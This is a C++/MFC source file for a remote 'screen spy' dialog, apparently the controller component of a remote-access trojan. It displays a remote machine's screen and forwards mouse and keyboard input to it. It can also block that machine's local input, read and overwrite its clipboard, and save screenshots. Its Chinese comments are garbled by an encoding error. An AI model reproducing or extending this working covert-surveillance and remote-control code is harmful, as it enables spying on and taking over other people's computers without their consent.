// ScreenSpyDlg.cpp : ʵ���ļ�
//

#include "stdafx.h"
#include "2015Remote.h"
#include "ScreenSpyDlg.h"
#include "afxdialogex.h"


// CScreenSpyDlg �Ի���

enum
{
	IDM_CONTROL = 0x1010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// ������ʾԶ�����
	IDM_BLOCK_INPUT,	// ����Զ�̼��������
	IDM_SAVEDIB,		// ����ͼƬ
	IDM_GET_CLIPBOARD,	// ��ȡ������
	IDM_SET_CLIPBOARD,	// ���ü�����
};


IMPLEMENT_DYNAMIC(CScreenSpyDlg, CDialog)

//CScreenSpyDlg::CScreenSpyDlg(CWnd* pParent /*=NULL*/)
//	: CDialog(CScreenSpyDlg::IDD, pParent)
#define ALGORITHM_DIFF 1
CScreenSpyDlg::CScreenSpyDlg(CWnd* Parent, IOCPServer* IOCPServer, CONTEXT_OBJECT* ContextObject)
: CDialog(CScreenSpyDlg::IDD, Parent)
{
	m_iocpServer	= IOCPServer;
	m_ContextObject	= ContextObject;

	CHAR szFullPath[MAX_PATH];
	GetSystemDirectory(szFullPath, MAX_PATH);
	lstrcat(szFullPath, "\\shell32.dll");  //ͼ��
	m_hIcon = ExtractIcon(AfxGetApp()->m_hInstance, szFullPath, 17);
	m_hCursor = LoadCursor(AfxGetApp()->m_hInstance,IDC_ARROW);



	sockaddr_in  ClientAddr;
	memset(&ClientAddr, 0, sizeof(ClientAddr));
	int ulClientAddrLen = sizeof(sockaddr_in);
	BOOL bOk = getpeername(m_ContextObject->sClientSocket,(SOCKADDR*)&ClientAddr, &ulClientAddrLen);

	m_strClientIP = bOk != INVALID_SOCKET ? inet_ntoa(ClientAddr.sin_addr) : "";


	

	m_bIsFirst = TRUE;
    m_ulHScrollPos = 0;
	m_ulVScrollPos = 0;


	if (m_ContextObject==NULL)
	{
		return;
	}
	ULONG	ulBitmapInforLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1;
	m_BitmapInfor_Full = (BITMAPINFO *) new BYTE[ulBitmapInforLength];

	if (m_BitmapInfor_Full==NULL)
	{
		return;
	}

	memcpy(m_BitmapInfor_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), ulBitmapInforLength);


	m_bIsCtrl = FALSE;
	m_bIsTraceCursor = FALSE;


//	m_szData = NULL;
//	m_bSend   = TRUE;
//	m_ulMsgCount = 0;;
}


VOID CScreenSpyDlg::SendNext(void)
{
	BYTE	bToken = COMMAND_NEXT;
	m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, 1);
}


CScreenSpyDlg::~CScreenSpyDlg()
{
	if (m_BitmapInfor_Full!=NULL)
	{
		delete m_BitmapInfor_Full;
		m_BitmapInfor_Full = NULL;


	}

	::ReleaseDC(m_hWnd, m_hFullDC);   //GetDC
	::DeleteDC(m_hFullMemDC);                //Createƥ���ڴ�DC

	::DeleteObject(m_BitmapHandle);
	if (m_BitmapData_Full!=NULL)
	{
		m_BitmapData_Full = NULL;
	}

}

void CScreenSpyDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CScreenSpyDlg, CDialog)
	ON_WM_CLOSE()
	ON_WM_PAINT()
	ON_WM_SYSCOMMAND()
END_MESSAGE_MAP()


// CScreenSpyDlg ��Ϣ�������


BOOL CScreenSpyDlg::OnInitDialog()
{
	CDialog::OnInitDialog();
	SetIcon(m_hIcon,FALSE);


	CString strString;
	strString.Format("\\\\%s Զ��������� %d��%d", m_strClientIP, m_BitmapInfor_Full->bmiHeader.biWidth, m_BitmapInfor_Full->bmiHeader.biHeight);
	SetWindowText(strString);

	
	m_hFullDC = ::GetDC(m_hWnd);
	m_hFullMemDC = CreateCompatibleDC(m_hFullDC);
	m_BitmapHandle = CreateDIBSection(m_hFullDC, m_BitmapInfor_Full, 
		DIB_RGB_COLORS, &m_BitmapData_Full, NULL, NULL);   //����Ӧ�ó������ֱ��д��ġ����豸�޹ص�λͼ


	SelectObject(m_hFullMemDC, m_BitmapHandle);//��һ����ָ�����豸�����Ļ���

	

	SetScrollRange(SB_HORZ, 0, m_BitmapInfor_Full->bmiHeader.biWidth);  //ָ����������Χ����Сֵ�����ֵ
	SetScrollRange(SB_VERT, 0, m_BitmapInfor_Full->bmiHeader.biHeight);//1366  768



	CMenu* SysMenu = GetSystemMenu(FALSE);
	if (SysMenu != NULL)
	{
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_CONTROL, "������Ļ(&Y)");
		SysMenu->AppendMenu(MF_STRING, IDM_TRACE_CURSOR, "���ٱ��ض����(&T)");
		SysMenu->AppendMenu(MF_STRING, IDM_BLOCK_INPUT, "�������ض����ͼ���(&L)");
		SysMenu->AppendMenu(MF_STRING, IDM_SAVEDIB, "�������(&S)");
		SysMenu->AppendMenu(MF_SEPARATOR);
		SysMenu->AppendMenu(MF_STRING, IDM_GET_CLIPBOARD, "��ȡ������(&R)");
		SysMenu->AppendMenu(MF_STRING, IDM_SET_CLIPBOARD, "���ü�����(&L)");
		SysMenu->AppendMenu(MF_SEPARATOR);

	}


	m_bIsCtrl = FALSE;   //���ǿ���
	m_bIsTraceCursor = FALSE;  //���Ǹ���
	m_ClientCursorPos.x = 0;
	m_ClientCursorPos.y = 0;

	SendNext();


	return TRUE;  // return TRUE unless you set the focus to a control
	// �쳣: OCX ����ҳӦ���� FALSE
}


VOID CScreenSpyDlg::OnClose()
{
	

	m_ContextObject->v1 = 0;
	CancelIo((HANDLE)m_ContextObject->sClientSocket);
	closesocket(m_ContextObject->sClientSocket);

	CDialog::OnClose();
}


VOID CScreenSpyDlg::OnReceiveComplete()
{
	if (m_ContextObject==NULL)
	{
		return;
	}

	switch(m_ContextObject->InDeCompressedBuffer.GetBuffer()[0])
	{
	case TOKEN_FIRSTSCREEN:
		{

//			MessageBox("1","1");
			DrawFirstScreen();            //������ʾ��һ֡ͼ�� һ��ת����������
			break;
		}

	case TOKEN_NEXTSCREEN:
		{

			if (m_ContextObject->InDeCompressedBuffer.GetBuffer(0)[1]==ALGORITHM_DIFF)
			{
				DrawNextScreenDiff();
			}
		

			break;
		}

	case TOKEN_CLIPBOARD_TEXT:            //����
		{
			UpdateServerClipboard((char*)m_ContextObject->InDeCompressedBuffer.GetBuffer(1), m_ContextObject->InDeCompressedBuffer.GetBufferLength() - 1);
			break;
		}
	}


}



VOID CScreenSpyDlg::DrawFirstScreen(void)
{
	m_bIsFirst = FALSE;

	//�õ����ض˷��������� ������������HBITMAP�Ļ������У�����һ��ͼ��ͳ�����
	memcpy(m_BitmapData_Full, m_ContextObject->InDeCompressedBuffer.GetBuffer(1), m_BitmapInfor_Full->bmiHeader.biSizeImage);


	PostMessage(WM_PAINT);//����WM_PAINT��Ϣ
}




VOID CScreenSpyDlg::DrawNextScreenDiff(void)
{
	//�ú�������ֱ�ӻ�����Ļ�ϣ����Ǹ���һ�±仯���ֵ���Ļ����Ȼ�����
	//OnPaint����ȥ
	//��������Ƿ��ƶ�����Ļ�Ƿ�仯�ж��Ƿ��ػ���꣬��ֹ�����˸
	BOOL	bChange = FALSE;
	ULONG	ulHeadLength = 1 + 1 + sizeof(POINT) + sizeof(BYTE); // ��ʶ + �㷨 + ��� λ�� + �����������
	LPVOID	FirstScreenData = m_BitmapData_Full;
	LPVOID	NextScreenData = m_ContextObject->InDeCompressedBuffer.GetBuffer(ulHeadLength);
	ULONG	NextScreenLength = m_ContextObject->InDeCompressedBuffer.GetBufferLength() - ulHeadLength;

	POINT	OldClientCursorPos;
	memcpy(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT));
	memcpy(&m_ClientCursorPos, m_ContextObject->InDeCompressedBuffer.GetBuffer(2), sizeof(POINT));

	// ����ƶ���
	if (memcmp(&OldClientCursorPos, &m_ClientCursorPos, sizeof(POINT)) != 0)
	{
		bChange = TRUE;
	}

	// ������ͷ����仯
/*	ULONG	ulOldCursorIndex = m_bCursorIndex;
	m_bCursorIndex = m_ContextObject->InDeCompressedBuffer.GetBuffer(10)[0];
	if (ulOldCursorIndex != m_bCursorIndex)
	{
		bIsReDraw = true;
		if (m_bIsCtrl && !m_bIsTraceCursor)  //m_bIsCtrl    m_bIsTraceCursor
		{

			//���������ʽ
			//hIco hion  hbuuton   hli      kdjfkjdf= loadkdjfk��afgmakekdjfkdf��dkfj����setioc(���)  ����
			SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)-1 ? 1 : m_bCursorIndex));  //�滻ָ�������������WNDCLASSEX�ṹ	
		}

	}*/

	// ��Ļ�Ƿ�仯
	if (NextScreenLength > 0) 
	{
		bChange = TRUE;
	}

	//lodsdָ���ESIָ����ڴ�λ��4���ֽ����ݷ���EAX�в�������4
	//movsbָ���ֽڴ������ݣ�ͨ��SI��DI�������Ĵ��������ַ�����Դ��ַ��Ŀ���ַ



	//m_rectBuffer [0002 esi0002 esi000A 000C]     [][]edi[][][][][][][][][][][][][][][][][]
	__asm
	{
		mov ebx, [NextScreenLength]   //ebx 16  
		mov esi, [NextScreenData]  
		jmp	CopyEnd
CopyNextBlock:
		mov edi, [FirstScreenData]
		lodsd	            // ��lpNextScreen�ĵ�һ��˫�ֽڣ��ŵ�eax��,����DIB�иı������ƫ��
			add edi, eax	// lpFirstScreenƫ��eax	
			lodsd           // ��lpNextScreen����һ��˫�ֽڣ��ŵ�eax��, ���Ǹı�����Ĵ�С
			mov ecx, eax
			sub ebx, 8      // ebx ��ȥ ����dword
			sub ebx, ecx    // ebx ��ȥDIB���ݵĴ�С
			rep movsb
CopyEnd:
		cmp ebx, 0 // �Ƿ�д�����
			jnz CopyNextBlock
	}

	if (bChange)
	{
		PostMessage(WM_PAINT);
	}
}




void CScreenSpyDlg::OnPaint()
{
	CPaintDC dc(this); // device context for painting
	// TODO: �ڴ˴������Ϣ����������
	// ��Ϊ��ͼ��Ϣ���� CDialog::OnPaint()



	if (m_bIsFirst)
	{
		DrawTipString("��ȴ�...........");
		return;
	}


	BitBlt(m_hFullDC,0,0,
		m_BitmapInfor_Full->bmiHeader.biWidth, 
		m_BitmapInfor_Full->bmiHeader.biHeight,
		m_hFullMemDC,
		m_ulHScrollPos,
		m_ulVScrollPos,
		SRCCOPY
		);


	if (m_bIsTraceCursor)
		DrawIconEx(
		m_hFullDC,								
		m_ClientCursorPos.x  - m_ulHScrollPos, 
		m_ClientCursorPos.y  - m_ulVScrollPos,
		m_hIcon,
		//m_CursorInfo.getCursorHandle(m_bCursorIndex == (BYTE)0 ? 1 : m_bCursorIndex),	// handle to icon to draw 
		0,0,										
		0,										
		NULL,									
		DI_NORMAL | DI_COMPAT					
		);
}



VOID CScreenSpyDlg::DrawTipString(CString strString)
{
	RECT Rect;
	GetClientRect(&Rect);
	//COLORREF�������һ��RGB��ɫ
	COLORREF  BackgroundColor = RGB(0x00, 0x00, 0x00);	
	COLORREF  OldBackgroundColor  = SetBkColor(m_hFullDC, BackgroundColor);
	COLORREF  OldTextColor = SetTextColor(m_hFullDC, RGB(0xff,0x00,0x00));
	//ExtTextOut���������ṩһ���ɹ�ѡ��ľ��Σ��õ�ǰѡ������塢������ɫ��������ɫ������һ���ַ���
	ExtTextOut(m_hFullDC, 0, 0, ETO_OPAQUE, &Rect, NULL, 0, NULL);

	DrawText (m_hFullDC, strString, -1, &Rect,
		DT_SINGLELINE | DT_CENTER | DT_VCENTER);

	SetBkColor(m_hFullDC, BackgroundColor);
	SetTextColor(m_hFullDC, OldBackgroundColor);
}


void CScreenSpyDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	// TODO: �ڴ������Ϣ�����������/�����Ĭ��ֵ

	CMenu* SysMenu = GetSystemMenu(FALSE);


	switch (nID)
	{
	case IDM_CONTROL:
		{
			m_bIsCtrl = !m_bIsCtrl;
			SysMenu->CheckMenuItem(IDM_CONTROL, m_bIsCtrl ? MF_CHECKED : MF_UNCHECKED);   //�˵���ʽ

			if (m_bIsCtrl)
			{
			/*	if (m_bIsTraceCursor)
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)AfxGetApp()->LoadCursor(IDC_DOT));
				else
					SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)m_hRemoteCursor);*/
			}
			else
			{
				//SetClassLong(m_hWnd, GCL_HCURSOR, (LONG)LoadCursor(NULL, IDC_NO));
			}


			break;
		}
	case IDM_SAVEDIB:    // ���ձ���
		{
			SaveSnapshot();
			break;
		}

	case IDM_TRACE_CURSOR: // ���ٱ��ض����
		{	
			m_bIsTraceCursor = !m_bIsTraceCursor;	                               //�����ڸı�����
			SysMenu->CheckMenuItem(IDM_TRACE_CURSOR, m_bIsTraceCursor ? MF_CHECKED : MF_UNCHECKED);    //�ڲ˵��򹳲���

			// �ػ���������ʾ���
			OnPaint();

			break;
		}
		
	case IDM_BLOCK_INPUT: // ������������ͼ���
		{
			BOOL bIsChecked = SysMenu->GetMenuState(IDM_BLOCK_INPUT, MF_BYCOMMAND) & MF_CHECKED;
			SysMenu->CheckMenuItem(IDM_BLOCK_INPUT, bIsChecked ? MF_UNCHECKED : MF_CHECKED);

			BYTE	bToken[2];
			bToken[0] = COMMAND_SCREEN_BLOCK_INPUT;
			bToken[1] = !bIsChecked;
			m_iocpServer->OnClientPreSending(m_ContextObject, bToken, sizeof(bToken));

			break;
		}
	case IDM_GET_CLIPBOARD:            //��ҪClient�ļ���������
		{
			BYTE	bToken = COMMAND_SCREEN_GET_CLIPBOARD;
			m_iocpServer->OnClientPreSending(m_ContextObject, &bToken, sizeof(bToken));

			break;
		}
	

	case IDM_SET_CLIPBOARD:              //����
		{
			SendServerClipboard();

			break;
		}
	}


	CDialog::OnSysCommand(nID, lParam);
}


BOOL CScreenSpyDlg::PreTranslateMessage(MSG* pMsg)
{
#define MAKEDWORD(h,l)        (((unsigned long)h << 16) | l) 
	switch (pMsg->message)
	{
	case WM_LBUTTONDOWN:
	case WM_LBUTTONUP:
	case WM_RBUTTONDOWN:
	case WM_RBUTTONUP:
	case WM_MOUSEMOVE:
	case WM_LBUTTONDBLCLK:
	case WM_RBUTTONDBLCLK:
	case WM_MBUTTONDOWN:
	case WM_MBUTTONUP:
	case WM_MOUSEWHEEL:
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
			Msg.pt.x += m_ulHScrollPos;
			Msg.pt.y += m_ulVScrollPos;
			SendCommand(&Msg);
		}
		break;
	case WM_KEYDOWN:
	case WM_KEYUP:
	case WM_SYSKEYDOWN:
	case WM_SYSKEYUP:
		if (pMsg->wParam != VK_LWIN && pMsg->wParam != VK_RWIN)
		{
			MSG	Msg;
			memcpy(&Msg, pMsg, sizeof(MSG));
			Msg.lParam = MAKEDWORD(HIWORD(pMsg->lParam) + m_ulVScrollPos, LOWORD(pMsg->lParam) + m_ulHScrollPos);
			Msg.pt.x += m_ulHScrollPos;
			Msg.pt.y += m_ulVScrollPos;
			SendCommand(&Msg);
		}
		if (pMsg->wParam == VK_RETURN || pMsg->wParam == VK_ESCAPE)
			return true;
		break;
	}
	
	return CDialog::PreTranslateMessage(pMsg);
}


VOID CScreenSpyDlg::SendCommand(MSG* Msg)
{
/*	if (!m_bIsCtrl)
	{
		if (m_szData!=NULL)
		{
			delete[] m_szData;
			m_szData = NULL;
			m_ulMsgCount = 0;
			m_bSend = TRUE;
		}
		return;
	}
	if (m_bSend==TRUE)
	{
		m_szData = new BYTE[sizeof(MSG)*10 + 1];
		m_szData[0] = COMMAND_SCREEN_CONTROL;
		memcpy(m_szData + 1, Msg, sizeof(MSG));
		m_bSend = FALSE;
		
	}
	else
	{
		m_ulMsgCount++;
		memcpy(m_szData+1 + sizeof(MSG)*m_ulMsgCount, Msg, sizeof(MSG));
	}
	if (m_ulMsgCount==9)
	{
		m_iocpServer->OnClientPreSending(m_ContextObject, m_szData, sizeof(MSG)*10 + 1);
		m_ulMsgCount = 0;
		m_bSend = TRUE;
		delete[] m_szData;
	}*/



	if (!m_bIsCtrl)
		return;

	LPBYTE szData = new BYTE[sizeof(MSG) + 1];
	szData[0] = COMMAND_SCREEN_CONTROL;
	memcpy(szData + 1, Msg, sizeof(MSG));
	m_iocpServer->OnClientPreSending(m_ContextObject, szData, sizeof(MSG) + 1);

	delete[] szData;
}






BOOL CScreenSpyDlg::SaveSnapshot(void)
{
/*	
	

	// BITMAPINFO��С
	*/
	CString	strFileName = m_strClientIP + CTime::GetCurrentTime().Format("_%Y-%m-%d_%H-%M-%S.bmp");
	CFileDialog Dlg(FALSE, "bmp", strFileName, OFN_OVERWRITEPROMPT, "λͼ�ļ�(*.bmp)|*.bmp|", this);
	if(Dlg.DoModal () != IDOK)
		return FALSE;

	BITMAPFILEHEADER	BitMapFileHeader;
	LPBITMAPINFO		BitMapInfor = m_BitmapInfor_Full; //1920 1080  1  0000
	CFile	File;
	if (!File.Open( Dlg.GetPathName(), CFile::modeWrite | CFile::modeCreate))
	{

		return FALSE;
	}

	// BITMAPINFO��С
	int	nbmiSize = sizeof(BITMAPINFO); //+ (BitMapInfor->bmiHeader.biBitCount > 16 ? 1 : (1 << BitMapInfor->bmiHeader.biBitCount)) * sizeof(RGBQUAD);   //bmp  fjkdfj  dkfjkdfj [][][][]

	//Э��  TCP    У��ֵ
	BitMapFileHeader.bfType			= ((WORD) ('M' << 8) | 'B');	
	BitMapFileHeader.bfSize			= BitMapInfor->bmiHeader.biSizeImage + sizeof(BitMapFileHeader);  //8421
	BitMapFileHeader.bfReserved1 	= 0;                                          //8000
	BitMapFileHeader.bfReserved2 	= 0;
	BitMapFileHeader.bfOffBits		= sizeof(BitMapFileHeader) + nbmiSize;

	File.Write(&BitMapFileHeader, sizeof(BitMapFileHeader));
	File.Write(BitMapInfor, nbmiSize);

	File.Write(m_BitmapData_Full, BitMapInfor->bmiHeader.biSizeImage);
	File.Close();

	return true;
}




VOID CScreenSpyDlg::UpdateServerClipboard(char *szBuffer,ULONG ulLength)
{
	if (!::OpenClipboard(NULL))
		return;

	::EmptyClipboard();
	HGLOBAL hGlobal = GlobalAlloc(GPTR, ulLength);  
	if (hGlobal != NULL) { 

		char*  szClipboardVirtualAddress  = (LPTSTR) GlobalLock(hGlobal); 
		memcpy(szClipboardVirtualAddress,szBuffer,ulLength); 
		GlobalUnlock(hGlobal);         
		SetClipboardData(CF_TEXT, hGlobal); 
		GlobalFree(hGlobal);
	}
	CloseClipboard();
}



VOID CScreenSpyDlg::SendServerClipboard(void)
{
	if (!::OpenClipboard(NULL))  //�򿪼��а��豸
		return;
	HGLOBAL hGlobal = GetClipboardData(CF_TEXT);   //������һ���ڴ�
	if (hGlobal == NULL)
	{
		::CloseClipboard();
		return;
	}
	int	  iPacketLength = GlobalSize(hGlobal) + 1;
	char*   szClipboardVirtualAddress = (LPSTR) GlobalLock(hGlobal);    //���� 
	LPBYTE	szBuffer = new BYTE[iPacketLength];


	szBuffer[0] = COMMAND_SCREEN_SET_CLIPBOARD;
	memcpy(szBuffer + 1, szClipboardVirtualAddress, iPacketLength - 1);
	::GlobalUnlock(hGlobal); 
	::CloseClipboard();
	m_iocpServer->OnClientPreSending(m_ContextObject,(PBYTE)szBuffer, iPacketLength);
	delete[] szBuffer;
}


/*  ������



void CScreenSpyDlg::InitMMI(void)
{
RECT	rectClient, rectWindow;
GetWindowRect(&rectWindow);  //���ڵı߿���εĳߴ硣�óߴ����������Ļ�������Ͻǵ���Ļ�������
GetClientRect(&rectClient);  //�ú�����ȡ���ڿͻ��������ꡣ�ͻ�������ָ���ͻ��������ϽǺ����½ǡ����ڿͻ�����������Դ��ڿͻ��������ϽǶ��Եģ�������Ͻ�����Ϊ��0��0��
ClientToScreen(&rectClient);

int	nBorderWidth = rectClient.left - rectWindow.left; // �߿��
int	nTitleWidth = rectClient.top - rectWindow.top; // �������ĸ߶�

int	nWidthAdd = nBorderWidth * 2 + GetSystemMetrics(SM_CYHSCROLL);   //���ڵõ��������ϵͳ���ݻ���ϵͳ������Ϣ. ˮƽ�������ĸ߶Ⱥ�ˮƽ�������ϼ�ͷ�Ŀ��
int	nHeightAdd = nTitleWidth + nBorderWidth + GetSystemMetrics(SM_CYVSCROLL);
int	nMinWidth = 400 + nWidthAdd;                            //���ô�����С��ʱ�Ŀ�ȣ��߶�
int	nMinHeight = 300 + nHeightAdd; 
int	nMaxWidth = m_lpbmi->bmiHeader.biWidth + nWidthAdd;     //���ô������ʱ�Ŀ�ȣ��߶�
int	nMaxHeight = m_lpbmi->bmiHeader.biHeight + nHeightAdd;


//���ô�����С��ȡ��߶�
m_MMI.ptMinTrackSize.x = nMinWidth;
m_MMI.ptMinTrackSize.y = nMinHeight;

// ���ʱ���ڵ�λ��
m_MMI.ptMaxPosition.x = 1;
m_MMI.ptMaxPosition.y = 1;

// �������ߴ�
m_MMI.ptMaxSize.x = nMaxWidth;
m_MMI.ptMaxSize.y = nMaxHeight;

// ������󻯳ߴ�
m_MMI.ptMaxTrackSize.x = nMaxWidth;
m_MMI.ptMaxTrackSize.y = nMaxHeight;
}




void CScreenSpyDlg::OnVScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar) //npos ��ǰ������λ��
{
SCROLLINFO si;
int	i;
si.cbSize = sizeof(SCROLLINFO);
si.fMask = SIF_ALL;
GetScrollInfo(SB_VERT, &si);  //1920  1080

switch (nSBCode)
{
case SB_LINEUP:
i = nPos - 1;  //0-1
break;
case SB_LINEDOWN:
i = nPos + 1;
break;
case SB_THUMBPOSITION:
case SB_THUMBTRACK:
i = si.nTrackPos;
break;
default:
return;
}

i = max(i, si.nMin);  //0      
i = min(i, (int)(si.nMax - si.nPage + 1));//i = 0    ��ֹ����   //1080    900


RECT rect;
GetClientRect(&rect);
//+		rect	{top=0 bottom=455 left=0 right=649}	tagRECT

if ((rect.bottom + i) > m_lpbmi->bmiHeader.biHeight)  //1080
{
i = m_lpbmi->bmiHeader.biHeight - rect.bottom;
}

InterlockedExchange((PLONG)&m_VScrollPos, i);  //m_VScrollPos = 0

SetScrollPos(SB_VERT, i);
OnPaint();
CDialog::OnVScroll(nSBCode, nPos, pScrollBar);


}






void CScreenSpyDlg::OnHScroll(UINT nSBCode, UINT nPos, CScrollBar* pScrollBar)
{
SCROLLINFO si;
int	i;
si.cbSize = sizeof(SCROLLINFO);
si.fMask = SIF_ALL;
GetScrollInfo(SB_HORZ, &si);

switch (nSBCode)
{
case SB_LINEUP:
i = nPos - 1;
break;
case SB_LINEDOWN:
i = nPos + 1;
break;
case SB_THUMBPOSITION:
case SB_THUMBTRACK:
i = si.nTrackPos;
break;
default:
return;
}

i = max(i, si.nMin);
i = min(i, (int)(si.nMax - si.nPage + 1));

RECT rect;
GetClientRect(&rect);

if ((rect.right + i) > m_lpbmi->bmiHeader.biWidth)
i = m_lpbmi->bmiHeader.biWidth - rect.right;

InterlockedExchange((PLONG)&m_HScrollPos, i);

SetScrollPos(SB_HORZ, m_HScrollPos);

OnPaint();

CDialog::OnHScroll(nSBCode, nPos, pScrollBar);
}




*/